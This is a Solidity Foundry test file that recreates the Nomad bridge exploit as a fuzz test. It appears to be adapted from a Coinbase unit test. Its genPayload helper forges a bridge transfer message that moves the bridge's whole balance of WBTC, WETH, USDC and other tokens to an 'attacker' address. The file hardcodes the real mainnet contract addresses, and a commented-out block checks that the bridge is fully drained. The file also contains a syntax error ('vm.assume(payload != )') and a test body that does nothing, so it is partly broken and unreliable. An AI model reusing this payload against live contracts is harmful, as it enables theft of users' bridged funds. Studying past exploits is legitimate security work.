// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
//citation: this fuzzing test is developed based on the initial unit
//test developed by coinbase 

//output: 
//test runs
//"μ" is the mean gas used across all fuzz runs
//"~" is the median gas used across all fuzz runs
contract NomadFuzzTest is Test {

    // tokens
    address [] public tokens = [
        //these are the tokens processed by Nomad Bridge App
        0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
        0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
        0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
        0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
    ];

    address attacker = msg.sender;

    // Nomad contracts
    address constant nmdReplica = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
    address constant nmdBridgeRouter = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
    address constant nmdERC20Bridge = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;

    // Nomad domain IDs
    uint32 ETHEREUM = 0x657468;   // "eth"
    uint32 MOONBEAM = 0x6265616d; // "beam"

    function setUp() public {
        // setting the next call's msg.sender as attacker
        //prank() info: https://book.getfoundry.sh/cheatcodes/prank
        // vm.createSelectFork("mainnet",15259100);
      
    }

    function testFuzzProcess(bytes memory _message) public {

        vm.startPrank(attacker);
        for (uint i = 0; i < tokens.length; i++) {
            address token = tokens[i];    
            uint256 amount_bridge = IERC20(token).balanceOf(nmdERC20Bridge);
            bytes memory payload = genPayload(attacker, token, amount_bridge);
            vm.assume(payload != )
            bool success = IReplica(nmdReplica).process(payload);
            assertTrue(success);  
     }          

/*
        for (uint i = 0; i < tokens.length; i++) {
            address token = tokens[i];    

            uint256 amount_bridge = IERC20(token).balanceOf(nmdERC20Bridge);
            vm.startPrank(attacker);
            uint256 amount_attacker = IERC20(token).balanceOf(attacker);

            // Generate the payload with all of the tokens stored on the bridge
            bytes memory payload = genPayload(attacker, token, amount_bridge);
            bool success = IReplica(nmdReplica).process(payload);
            assertTrue(success);            
            assertEq(IERC20(token).balanceOf(nmdERC20Bridge), 0);
            assertEq(IERC20(token).balanceOf(attacker) - amount_attacker, amount_bridge);
        }
        
        */
    }

    function testFuzzInitialize( uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds) public {
        
        //assume() is for narrow checks; otherwise it's gonna take a long time
        //if we assume _committedRoot != 0, the foundry would skip the testing values of 
        //_committedRoot == 0, so it's supposed to pass initializer 
        vm.assume(_committedRoot != 0);
    }

//this is the helper function to pass on constructor parameters
    function genPayload(address recipient, address token, uint256 amount) public view returns (bytes memory) {

        bytes memory payload = abi.encodePacked(
            MOONBEAM,                   // Home chain domain
            uint256(nmdBridgeRouter),   // Sender: bridge
            uint32(0),                  // Dst nonce
            ETHEREUM,                   // Dst chain domain
            uint256(nmdERC20Bridge),    // Recipient (Nomad ERC20 bridge)
            ETHEREUM,                   // Token domain
            uint256(token),             // token id (e.g. WBTC)
            uint8(0x3),                 // Type - transfer
            uint256(recipient),         // Recipient of the transfer
            uint256(amount),            // Amount (e.g. 10000000000)
            uint256(0)                  // Optional: Token details hash
                                        // keccak256(                  
                                        //     abi.encodePacked(
                                        //         bytes(tokenName).length,
                                        //         tokenName,
                                        //         bytes(tokenSymbol).length,
                                        //         tokenSymbol,
                                        //         tokenDecimals
                                        //     )
                                        // ) 
        );

        return payload;
    }
}

interface IERC20 {
  function balanceOf(address owner) external view returns (uint256);
  function symbol() external view returns (string memory);
}

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external;
   /* 
    public initializer {
        __NomadBase_initialize(_updater);
        // set storage variables
        entered = 1;
        remoteDomain = _remoteDomain;
        committedRoot = _committedRoot;
        confirmAt[_committedRoot] = 1;
        optimisticSeconds = _optimisticSeconds;
        emit SetOptimisticTimeout(_optimisticSeconds);
    };
    */
}